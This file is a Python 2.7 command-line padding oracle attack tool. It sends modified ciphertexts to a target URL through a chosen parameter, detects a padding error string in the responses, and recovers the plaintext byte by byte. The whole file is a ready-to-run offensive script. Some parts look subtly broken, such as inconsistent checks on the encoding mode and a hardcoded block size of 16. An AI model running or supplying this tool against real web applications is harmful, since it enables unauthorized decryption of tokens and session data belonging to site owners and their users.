#!/usr/bin/env/ python2.7

import json
import base64
import requests
import sys
import argparse

def main():
    args = intro()
    url = args.url
    ciphertext = args.ciphertext
    encoding = args.encoding
    parameter = args.parameter
    http_method = args.http_method
    error_string = args.error_string
    block_size = args.block_size
    verbose = args.verbose
    very_verbose = args.very_verbose
    subkey = ''
    final = ''
    hex_string = ('A' * block_size) + decode(ciphertext, encoding)
    num_of_blocks = (len(hex_string)/block_size) - 1
    for i in range((len(hex_string)/16) - 1):
        next_block = ''
        dec_block = hex_string[0-(i + 2) * block_size:0-(i + 1) * block_size]
        pad_block = hex_string[len(hex_string) - ((i + 1) * block_size): len(hex_string) - (i * block_size)]
        full_block = dec_block + pad_block
        subkey = get_next_block_helper(url, full_block, i + 1, dec_block, block_size, num_of_blocks, encoding, parameter, http_method, error_string, verbose, very_verbose)
        for i in range(block_size):
            keybyte = ord(subkey[i]) ^ block_size
            next_block += chr(keybyte ^ ord(dec_block[i]))
        print('[+] Decrypted Block:' + next_block)
        final = next_block + final
    print('============FINISHED============')
    print('[+] Decrypted String: ' + final)
    print('================================')

def intro():
    print('''**********************************************
     ____   _   _ _____ _   __________
    |  __ \| | | |     | | |__   _|_  \\
    | |__) | |_| |_   _| |/  \| | |_ \ \\
    |   __/ \__, | | | |  /\  | |   _   \\
    |  |    |___/  | | |_|  |_| |__| |___\\
    |__|           |_|      |_____|       KilgoreRuT

    ***********************************************''')
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", help="target url", required=True)
    parser.add_argument("-c","--ciphertext", help="ciphertext to decode", required=True)
    parser.add_argument("-p","--parameter", help="parameter to use with ciphertext", required=True)
    parser.add_argument("-e","--encoding", help="encoding mode, please choose one: 1)base64 2)websafe base64 3)hex", required=False, default=2)
    parser.add_argument("-m","--http-method", help="http method (GET or POST)", required=False, default="get")
    parser.add_argument("-t","--error-string", help="string in response to indicate padding exception", required=False, default="PaddingException")
    parser.add_argument("-b","--block-size", help="block size", required=False, default=16)
    parser.add_argument("-v","--verbose", help="verbose output", action='store_true')
    parser.add_argument("-vv","--very-verbose", help="very verbose output", action='store_true')
    args = parser.parse_args()
    return args

def decode(ciphertext, encoding):
    if encoding == '1':
        dec = lambda x: base64.decodestring(x)
    elif encoding == '2':
        dec = lambda x: base64.decodestring(x.replace('~', '=').replace('!', '/').replace('-', '+'))
    elif encoding == 3:
        dec = lambda x: x.decode('hex')
    else:
        sys.exit('invalid encoding mode\nplease choose a valid encoding (1,2, or 3)')
    return dec(ciphertext)

def encode(rawData, encoding):
    if encoding == '1':
        enc = lambda x: base64.b64encode(x)
    elif encoding == '2':
        enc = lambda x: base64.b64encode(x).replace('=', '~').replace('/', '!').replace('+', '-').strip()
    elif encoding == '3':
        enc = lambda x: x.encode('hex')
    else:
        sys.exit('invalid encoding mode\nplease choose a valid encoding (1,2, or 3)')
    return enc(rawData)

def get_next_block_helper(url, hex_string, block_num, prev_block, block_size, num_of_blocks, encoding, parameter, http_method, error_string, verbose, very_verbose):
    print('\n*** Getting Block ' + str(num_of_blocks - (block_num - 1)) + '/' + str(num_of_blocks) + ' ***')
    ret = get_next_block(url, hex_string, 0, prev_block, block_size, encoding, parameter, http_method, error_string, verbose, very_verbose)
    return ret

def get_next_block(url, hex_string, pos, prev_block, block_size, encoding, parameter, http_method, error_string, verbose, very_verbose):
    ret = None
    if pos == block_size:
        return hex_string
    xor_update = {1:3, 2:1, 3:7, 4:1, 5:3, 6:1, 7:15, 8:1, 9:3, 10:1, 11:7, 12:1, 13:3, 14:1, 15:31, 16:1}
    print('*** Getting Byte ' + str(16-pos) + ' ***')
    for i in range(256):
        post_string = ''
        for j in range(len(hex_string)):
            if j >= len(hex_string) - (pos + block_size) and j < block_size:
                post_string += chr(ord(hex_string[j]) ^ xor_update[pos])
            elif j == len(hex_string) - (pos + block_size + 1):
                post_string += chr(i)
            else:
                post_string += hex_string[j]
        if very_verbose:
            print('request string: ' + encode(post_string, encoding))
            print('url: ' + url)
        if http_method.lower() == 'get':
            req = requests.get(url + '?' + parameter + '=' + encode(post_string, encoding))
        elif http_method == 'post':
            req = requests.post(url, data={parameter: encode(post_string, encoding)})
        else:
            sys.exit('please choose either post or get as http-method')
        if very_verbose:
            print(req.text)
        if error_string not in req.text and i != ord(prev_block[(block_size - 1) - pos]):
            print('[+] Found Oracle Byte!')
            if verbose or very_verbose:
                print('    oraclebyte: ' + '\\x' + chr(i).encode('hex-codec'))
                print('    padding: ' + '\\x' + chr(pos + 1).encode('hex-codec'))
                print('    keybyte: ' + '\\x' + chr((pos + 1) ^ i).encode('hex_codec'))
            print('[+] Decrypted Byte: ' + chr((pos + 1) ^ i ^ ord(prev_block[block_size - (pos + 1)])) + '\n')
            return get_next_block(url, post_string, pos + 1, prev_block, block_size, encoding, parameter, http_method, error_string, verbose, very_verbose)
        elif 'PaddingException' not in req.text:
            ret = post_string
    return get_next_block(url, ret, pos + 1, prev_block, block_size, encoding, parameter, http_method, error_string, verbose, very_verbose)


if __name__ == '__main__':
	main()
